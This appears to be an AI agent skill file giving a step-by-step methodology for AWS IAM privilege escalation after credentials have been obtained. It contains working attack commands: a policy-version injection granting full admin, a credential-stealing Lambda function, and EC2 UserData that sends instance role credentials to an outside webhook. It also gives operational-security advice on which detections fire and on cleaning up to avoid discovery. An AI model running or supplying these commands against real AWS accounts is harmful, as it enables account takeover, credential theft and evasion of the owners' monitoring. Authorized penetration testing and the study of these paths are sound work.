---
name: aws-iam-privesc
description: "AWS IAM privilege escalation methodology. Use when AWS credentials have been obtained and privileges must be escalated, when the current IAM user/role has limited permissions and lateral or vertical privilege escalation is needed, or when IAM policies must be analyzed to find escalation paths. Covers escalation techniques for 46 AWS services, including PassRole abuse, AssumeRole chaining, Lambda/EC2/ECS compute service escalation, and NotAction implicit permission abuse"
zh-signals: "AWS IAM 权限提升方法论，利用 PassRole、AssumeRole 链与计算服务配置实现纵向与横向提权。信号:AWS,IAM,提权,PassRole,AssumeRole,云安全"
when-to-use: "Use after obtaining AWS credentials when you need to enumerate IAM policies and escalate privileges via PassRole, AssumeRole chains, or compute-service abuse within an authorized scope."
metadata:
  tags: "aws,iam,privilege-escalation,passrole,assumerole,privesc,lambda,ec2,sts,policy,priv-esc,lateral-movement"
  category: "cloud"
---

# AWS IAM Privilege Escalation Methodology

Privilege escalation in AWS environments is one of the most critical attack phases. Unlike traditional operating system privilege escalation, the core of AWS privilege escalation lies in abusing combinations of IAM permissions — an apparently harmless `iam:PassRole` permission, combined with permission to create compute services, lets an attacker obtain the full permissions of an arbitrary role. AWS has hundreds of permissions, and many permission combinations can form escalation chains.

**Key point**: `iam:PassRole` is the most common vector in AWS privilege escalation. When an IAM policy uses `NotAction` to exclude certain actions, it may implicitly grant a large number of sensitive permissions, including PassRole.

## Further Reading

After identifying the specific escalation cluster, load the corresponding reference document for full technical details:

- Core IAM/STS/Organizations escalation → see [references/iam-sts-privesc.md](references/iam-sts-privesc.md)
- Compute service escalation (EC2/Lambda/ECS/Glue, etc.) → see [references/compute-privesc.md](references/compute-privesc.md)
- Other service escalation (S3/DynamoDB/KMS, etc.) → see [references/service-privesc.md](references/service-privesc.md)

## Core Concept: PassRole

### What Is PassRole

`iam:PassRole` is a special IAM permission that allows a user to "pass" an IAM role to an AWS service. The service then runs with that role's identity, holding all of the role's permissions.

**Workflow**:
```
Attacker (has PassRole + service creation permission)
    │
    ├── 1. Find/create a high-privilege role (e.g., AdminRole)
    ├── 2. Pass that role to a service (e.g., Lambda)
    ├── 3. The service executes code as AdminRole
    └── 4. The attacker obtains AdminRole temporary credentials through the service
```

### Why PassRole Is the Most Common Escalation Vector

- Nearly every AWS compute service (Lambda, EC2, ECS, Glue, SageMaker, etc.) accepts role passing
- Administrators usually grant `iam:PassRole` without restricting `Resource` to a specific role (using `*`)
- Once you hold PassRole + creation permission on any compute service, you can escalate to the target role

### How to Identify PassRole Permissions

```bash
# Check the policies of the current user/role
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam get-user-policy --user-name <user> --policy-name <policy>

# Search for policies containing PassRole
aws iam get-policy-version --policy-arn <arn> --version-id <vid> \
  | grep -i "passrole"
```

### The NotAction Implicit Authorization Trap

When a policy uses `NotAction` + `Allow`, it actually allows every action except the specified ones:

```json
{
  "Effect": "Allow",
  "NotAction": "s3:DeleteBucket",
  "Resource": "*"
}
```

**This policy implicitly grants all sensitive permissions, including `iam:PassRole`, `iam:CreateUser`, and `sts:AssumeRole`**. This is a very common misconfiguration in real-world engagements.

## Privilege Escalation Decision Tree

After obtaining credentials, walk the following decision tree to check the available escalation paths:

```
Current permission analysis
├─ Has iam:* or iam:Create*/Attach* permissions
│   ├─ iam:CreateUser + iam:AttachUserPolicy → create an Admin user directly
│   ├─ iam:CreatePolicyVersion → modify an existing policy to Admin
│   ├─ iam:AttachUserPolicy / AttachGroupPolicy / AttachRolePolicy → attach an Admin policy
│   ├─ iam:PutUserPolicy / PutGroupPolicy / PutRolePolicy → add an inline Admin policy
│   ├─ iam:AddUserToGroup → join the Admin group
│   ├─ iam:CreateAccessKey → create a key for a high-privilege user
│   ├─ iam:CreateLoginProfile / UpdateLoginProfile → set the console password
│   ├─ iam:UpdateAssumeRolePolicy → modify the trust policy to allow yourself to AssumeRole
│   ├─ iam:SetDefaultPolicyVersion → roll back to a permissive policy version
│   └─ iam:UpdateSAMLProvider → tamper with SAML federation
│       → see references/iam-sts-privesc.md
│
├─ Has iam:PassRole + compute service creation permission
│   ├─ + lambda:CreateFunction + lambda:InvokeFunction → Lambda escalation
│   ├─ + ec2:RunInstances → EC2 UserData escalation
│   ├─ + ecs:RegisterTaskDefinition + ecs:RunTask → ECS escalation
│   ├─ + glue:CreateJob + glue:StartJobRun → Glue escalation
│   ├─ + sagemaker:CreateNotebookInstance → SageMaker escalation
│   ├─ + codebuild:CreateProject + codebuild:StartBuild → CodeBuild escalation
│   ├─ + cloudformation:CreateStack → CloudFormation escalation
│   ├─ + datapipeline:CreatePipeline → DataPipeline escalation
│   ├─ + apprunner:CreateService → AppRunner escalation
│   └─ + stepfunctions:CreateStateMachine → Step Functions escalation
│       → see references/compute-privesc.md
│
├─ Has sts:AssumeRole
│   ├─ Enumerate roles with permissive trust policies (Principal: "*")
│   ├─ Cross-account role chain → Organizations escalation
│   └─ IAM Roles Anywhere (X.509 certificates)
│       → see references/iam-sts-privesc.md
│
├─ Has service-specific permissions
│   ├─ ssm:SendCommand / ssm:StartSession → SSM escalation to EC2
│   ├─ s3:PutObject (CloudFormation template bucket) → hijack the deployment
│   ├─ dynamodb:PutResourcePolicy → authorize yourself for access
│   ├─ kms:PutKeyPolicy / kms:CreateGrant → KMS key access
│   ├─ secretsmanager:GetSecretValue → read credentials
│   ├─ codebuild:StartBuild → escalate by overriding the buildspec
│   ├─ lambda:UpdateFunctionCode → modify existing Lambda code
│   ├─ ecr:SetRepositoryPolicy → image supply chain attack
│   └─ cognito-identity:SetIdentityPoolRoles → Cognito role escalation
│       → see references/service-privesc.md
│
└─ Permissions are very limited
    ├─ Enumerate all available permissions → enumerate-iam
    ├─ Check service by service → Pacu iam__privesc_scan
    └─ Graph analysis → PMapper to build a permission graph
```

## Top 10 High-Frequency Escalation Paths

| # | Required Permission | Escalation Method | Result |
|---|---------|---------|------|
| 1 | `iam:CreatePolicyVersion` | Create a new policy version and set it as default, with content `Allow */*` | Admin |
| 2 | `iam:AttachUserPolicy` | Attach `AdministratorAccess` directly to the current user | Admin |
| 3 | `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Create a Lambda function that runs code with the high-privilege role | Target Role |
| 4 | `iam:PassRole` + `ec2:RunInstances` | Launch EC2 and steal the role credentials via UserData/SSH | Target Role |
| 5 | `iam:PassRole` + `ecs:RegisterTaskDefinition` + `ecs:RunTask` | Register and run a malicious task definition | Target Role |
| 6 | `iam:PassRole` + `cloudformation:CreateStack` | Create a stack that calls arbitrary AWS APIs | CF Role |
| 7 | `iam:CreateAccessKey` | Create an access key for another high-privilege user | Target User |
| 8 | `sts:AssumeRole` (role with a permissive trust policy) | Directly impersonate a high-privilege role | Target Role |
| 9 | `iam:PassRole` + `glue:CreateJob` | Create a Glue job that executes a reverse shell | Target Role |
| 10 | `lambda:UpdateFunctionCode` | Modify existing Lambda code to inject a backdoor | Lambda Role |

### Path 1: iam:CreatePolicyVersion — Policy Version Injection

The simplest escalation method. Use the `--set-as-default` flag to create a new policy version that takes effect immediately, with no extra permissions required. All users/groups/roles attached to the policy instantly gain the new permissions.

```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

**Detection**: CloudTrail records `CreatePolicyVersion` events; policy version changes are auditable.

### Path 2: iam:AttachUserPolicy — Attach a Managed Policy

Directly attach the AWS managed `AdministratorAccess` policy to the current user.

```bash
aws iam attach-user-policy --user-name <current_user> \
  --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```

**Variants**: `iam:AttachGroupPolicy` (attach to a group you belong to), `iam:AttachRolePolicy` (attach to a role, requires AssumeRole).

### Path 3: PassRole + Lambda — The Classic PassRole Escalation

Create a Lambda function bound to a high-privilege role; inside the function, read the environment variables to obtain temporary credentials and return them.

```bash
# Create the function code that steals credentials
cat > /tmp/steal.py << 'EOF'
def handler(event, context):
    import os
    return {'env': dict(os.environ)}
EOF
cd /tmp && zip steal.zip steal.py

aws lambda create-function --function-name privesc \
  --runtime python3.9 --role <target_role_arn> \
  --handler steal.handler --zip-file fileb:///tmp/steal.zip

aws lambda invoke --function-name privesc /tmp/out.json && cat /tmp/out.json
```

**Note**: A network-isolated Lambda cannot open a reverse shell, but it can leak credentials directly through the return value.

### Path 4: PassRole + EC2 — UserData Escalation

Launch an EC2 instance and run commands through UserData, obtaining the role credentials from IMDS.

```bash
aws ec2 run-instances --image-id <ami_id> --instance-type t2.micro \
  --iam-instance-profile Name=<instance_profile> \
  --user-data '#!/bin/bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> | curl -X POST -d @- https://<webhook>'
```

**Note**: Using EC2 role credentials from outside the instance triggers the GuardDuty `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` finding.

### Path 5: PassRole + ECS — Task Definition Escalation

Register a task definition containing a malicious container and obtain the task role credentials from the ECS metadata endpoint (`169.254.170.2`). Both Fargate and EC2 launch types are exploitable. You can also use `--overrides` to directly override the role and command of an existing task.

### Path 6: PassRole + CloudFormation — Infrastructure as Code Escalation

A CloudFormation stack can create arbitrary AWS resources. Build a template that contains malicious IAM resources (such as a new admin user) and deploy it through a high-privilege CF role.

### Path 7: iam:CreateAccessKey — Key Creation

If the target user already has 2 keys, you must first use `iam:DeleteAccessKey` to delete one. After creation you can use the target user's full permissions.

### Path 8: sts:AssumeRole — Role Impersonation

The key is finding roles whose trust policy is loosely configured. `Principal: "*"` means any AWS principal can impersonate them.

```bash
# Enumerate the trust policy of every role
for role in $(aws iam list-roles --query 'Roles[].RoleName' --output text); do
  echo "=== $role ==="
  aws iam get-role --role-name $role --query 'Role.AssumeRolePolicyDocument'
done
```

### Paths 9-10: Glue Job / Lambda Code Modification

The Glue job escalation pattern is similar to Lambda but runs scripts from S3. `lambda:UpdateFunctionCode` needs no PassRole — it modifies existing function code directly; if the function is auto-triggered (API Gateway, S3 events, etc.), the injected code runs automatically.

**Full exploitation commands** → see [references/compute-privesc.md](references/compute-privesc.md) and [references/service-privesc.md](references/service-privesc.md).

## Index by Service Cluster

### IAM/STS/Organizations Cluster

Core IAM escalation techniques — the most direct cluster, with no compute service used as an intermediary: modify IAM configuration directly to obtain high privileges.

**Main technique categories**:

| Technique Category | Key Permission | Escalation Effect |
|---------|---------|---------|
| Policy manipulation | `iam:CreatePolicyVersion`, `iam:SetDefaultPolicyVersion` | Modify policy content to obtain Admin |
| Policy attachment | `iam:AttachUserPolicy`, `iam:PutUserPolicy`, etc. | Attach/inject an Admin policy |
| Group management | `iam:AddUserToGroup` | Join a high-privilege group |
| Credential creation | `iam:CreateAccessKey`, `iam:CreateLoginProfile` | Obtain the target user's credentials |
| Trust tampering | `iam:UpdateAssumeRolePolicy`, `iam:UpdateSAMLProvider` | Modify the trust policy or SAML |
| MFA takeover | `iam:CreateVirtualMFADevice` + `iam:EnableMFADevice` | Take over the target user's MFA |
| STS role chain | `sts:AssumeRole`, `sts:AssumeRoleWithSAML` | Impersonate a high-privilege role |
| SSO escalation | `sso:PutInlinePolicyToPermissionSet`, `sso:CreateAccountAssignment` | Modify the permission set |
| Cognito | `cognito-identity:SetIdentityPoolRoles` | Hijack the identity pool role |
| Roles Anywhere | X.509 certificate + permissive trust policy | Impersonate any role |

Services involved: IAM, STS, Organizations, IAM Identity Center (SSO), Directory Services, Cognito

→ see [references/iam-sts-privesc.md](references/iam-sts-privesc.md)

### Compute Service Cluster

All escalation paths based on `iam:PassRole` + compute service creation permission. The attack pattern is uniform: create a compute resource → attach a high-privilege role → execute code inside the compute resource → steal the role credentials.

**Main technique categories**:

| Service | PassRole Pattern | No-PassRole Pattern |
|------|-------------|-----------------|
| EC2 | RunInstances + UserData/SSH | ModifyInstanceAttribute, SendSSHPublicKey |
| Lambda | CreateFunction + Invoke | UpdateFunctionCode, UpdateFunctionConfiguration (environment variable RCE) |
| ECS | RegisterTaskDefinition + RunTask | ExecuteCommand into the container, RegisterContainerInstance |
| Glue | CreateDevEndpoint / CreateJob | UpdateDevEndpoint (SSH key replacement), UpdateJob |
| SageMaker | CreateNotebookInstance | CreatePresignedNotebookInstanceUrl / CreatePresignedDomainUrl |
| CodeBuild | CreateProject + StartBuild | StartBuild (buildspec override), UpdateProject |
| CloudFormation | CreateStack / CreateChangeSet | UpdateStack (leverage an already attached role) |
| Step Functions | CreateStateMachine + StartExecution | TestState (test a single state directly) |
| EventBridge | CreateSchedule (Universal Target) | - |
| EMR | RunJobFlow + SSH | OpenEditorInConsole |
| AppRunner | CreateService | - |
| DataPipeline | CreatePipeline + PutPipelineDefinition | - |
| CodePipeline | CreatePipeline | PollForJobs (obtain temporary S3 credentials) |
| Elastic Beanstalk | CreateApplication + S3 write | RebuildEnvironment (code replacement) |

Services involved: EC2, Lambda, ECS/EKS, Glue, SageMaker, EMR, CodeBuild, CodePipeline, CodeStar, Elastic Beanstalk, AppRunner, Step Functions, DataPipeline, EventBridge Scheduler

→ see [references/compute-privesc.md](references/compute-privesc.md)

### Other Service Cluster

Escalation paths for data, security, and infrastructure services. Mostly indirect escalation — achieved by accessing sensitive data, modifying resource policies, or hijacking deployment pipelines.

**Main technique categories**:

| Service | Key Permission | Escalation Method |
|------|---------|---------|
| SSM | `ssm:SendCommand`, `ssm:StartSession` | Remote command execution, steal EC2/ECS role credentials |
| S3 | `s3:PutObject` (configuration bucket) | Tamper with CF templates/Terraform state/Buildspec |
| DynamoDB | `dynamodb:PutResourcePolicy` | Resource policy injection, grant cross-account access |
| KMS | `kms:PutKeyPolicy`, `kms:CreateGrant` | Key policy modification, decrypt protected data |
| SecretsManager | `secretsmanager:GetSecretValue` | Directly read stored credentials/passwords |
| ECR | `ecr:SetRepositoryPolicy`, `ecr:PutImage` | Image supply chain attack, tag overwrite |
| EBS | `ebs:GetSnapshotBlock` | Download a snapshot to extract credentials (e.g., AD passwords) |
| RDS | `rds:ModifyDBInstance` | Reset the database password |
| SNS/SQS | `sns:Subscribe`, `sqs:ReceiveMessage` | Intercept messages to obtain sensitive information |
| Lightsail | `lightsail:DownloadDefaultKeyPair` | Obtain the SSH key (not an IAM escalation) |
| Route53 | `route53:ChangeResourceRecordSets` | DNS hijacking to assist the attack |

Services involved: S3, DynamoDB, RDS, KMS, SecretsManager, SNS, SQS, SSM, CloudFormation (no PassRole), Redshift, EBS, EFS, ECR, Lightsail, etc.

→ see [references/service-privesc.md](references/service-privesc.md)

## Permission-to-Service Quick Reference Matrix

When you find a specific permission, quickly locate the possible escalation paths:

| Discovered Permission | Escalation Path to Check | Reference |
|-----------|----------------|------|
| `iam:PassRole` (Resource: *) | All compute service escalations | compute-privesc.md |
| `iam:PassRole` (Resource: specific role) | Check that role's permissions and pick the matching compute service | compute-privesc.md |
| `iam:Create*` / `iam:Attach*` / `iam:Put*` | Direct IAM escalation | iam-sts-privesc.md |
| `sts:AssumeRole` | Enumerate roles with permissive trust policies | iam-sts-privesc.md |
| `lambda:*` | Lambda code modification/creation | compute-privesc.md |
| `ec2:RunInstances` / `ec2:Modify*` | EC2 escalation | compute-privesc.md |
| `ecs:*` | ECS task definition/container command execution | compute-privesc.md |
| `ssm:SendCommand` / `ssm:StartSession` | SSM remote execution | service-privesc.md |
| `s3:PutObject` (infrastructure bucket) | Config file/template tampering | service-privesc.md |
| `codebuild:StartBuild` | Buildspec override | compute-privesc.md |
| `secretsmanager:GetSecretValue` | Directly read credentials | service-privesc.md |
| `kms:PutKeyPolicy` | KMS key takeover | service-privesc.md |
| `cognito-identity:*` | Cognito role hijacking | iam-sts-privesc.md |

## Escalation Detection and Automation Tools

### Permission Enumeration Tools

| Tool | Purpose | Command Example |
|------|------|---------|
| enumerate-iam | Brute-force enumerate the APIs available to the current credentials | `python enumerate-iam.py --access-key AKIA... --secret-key ...` |
| Pacu (iam__enum_permissions) | Enumerate IAM permissions | `run iam__enum_permissions` |
| ScoutSuite | Multi-cloud security audit | `scout aws --profile <profile>` |

### Escalation Path Analysis Tools

| Tool | Purpose | Command Example |
|------|------|---------|
| Pacu (iam__privesc_scan) | Automatically scan 21+ known escalation paths | `run iam__privesc_scan` |
| PMapper (Principal Mapper) | Graph-analyze IAM permission relationships and visualize escalation chains | `pmapper graph create && pmapper analysis` |
| Cloudsplaining | Analyze excessive permissions and dangerous grants in IAM policies | `cloudsplaining scan --input-file account-auth.json` |
| aws_escalate.py | The original RhinoSecurityLabs escalation detection script | `python aws_escalate.py` |
| Cognito Scanner | Dedicated Cognito attack tool | `cognito-scanner --identity-pool-id <id>` |

### Recommended Escalation Review Workflow

**Step 1: Confirm identity and permissions**

```bash
# Confirm the current identity
aws sts get-caller-identity

# List the policies attached to the user
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>

# List the groups the user belongs to
aws iam list-groups-for-user --user-name <user>

# If it is a role, list the role policies
aws iam list-attached-role-policies --role-name <role>
```

**Step 2: Automated scanning**

```bash
# Use Pacu to scan automatically
# Inside the Pacu shell:
run iam__enum_permissions
run iam__privesc_scan

# Or use PMapper to build a permission graph
pmapper graph create
pmapper query "who can do iam:PassRole with arn:aws:iam::*:role/*"
pmapper query "who can do sts:AssumeRole with *"
pmapper analysis --output results.txt
```

**Step 3: Manual verification**

Based on the discovered permissions, manually verify feasible escalation paths using this document's decision tree and the reference files.

### Special AWS CDK Escalation Paths

Environments using AWS CDK contain pre-provisioned roles that follow the `cdk-<qualifier>-<name>-<account>-<region>` naming pattern. The default qualifier is `hnb659fds`. Key roles:

- `cdk-hnb659fds-cfn-exec-role-<account>-<region>` — CloudFormation execution role, usually holds `*/*` permissions
- `cdk-hnb659fds-deploy-role-<account>-<region>` — deployment role

If you can AssumeRole into the deploy-role or modify the CDK project source code, you can inject malicious CloudFormation resources to obtain Admin.

## Notes

### Operational Security (OPSEC)

- **CloudTrail logs**: Almost all IAM/STS operations are recorded. High-risk events include:
  - `CreatePolicyVersion`, `AttachUserPolicy`, `CreateAccessKey`
  - `PassRole` (recorded as a parameter of other API calls)
  - `AssumeRole`, `AssumeRoleWithSAML`
- **GuardDuty detections**:
  - `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` — EC2 role credentials used outside the instance
  - `Recon:IAMUser/UserPermissions` — bulk IAM enumeration activity
  - `PrivilegeEscalation:IAMUser/AdministrativePermissions` — privilege escalation behavior
- **Asynchronous operation waits**:
  - EC2 startup takes about 1-3 minutes
  - Glue DevEndpoint preparation takes about 5-10 minutes
  - SageMaker notebook creation takes about 3-5 minutes
  - CloudFormation stack creation time depends on the number of resources
- **Resource cleanup**: Clean up the resources you created (Lambda functions, EC2 instances, etc.) promptly after escalation to reduce the chance of detection

### Escalation Prerequisite Validation

- **Cross-account AssumeRole**: The target role's trust policy must allow the attacker account, and the attacker account's own policy must allow `sts:AssumeRole`
- **PassRole resource restriction**: Check the `Resource` field of `iam:PassRole` — `*` means any role can be passed, while a specific ARN means only the listed role can be passed
- **Service trust relationship**: The passed role must trust the target service (e.g., a Lambda role must trust `lambda.amazonaws.com`)
- **Permissions boundary**: Even after attaching an Admin policy, a permissions boundary may limit the permissions that actually take effect
- **SCP (Service Control Policy)**: An Organizations SCP may restrict member account actions even when Admin permissions are held
- **VPC network restriction**: Some escalation paths (such as RDS password reset) require network access to the target resource

### Cross-References

- Refer to the `aws-pentesting` skill for the overall attack workflow
- Refer to the `cloud-iam-audit` skill for cross-cloud IAM auditing
- Refer to the `aws-iam-policy-analysis` skill for in-depth policy configuration analysis
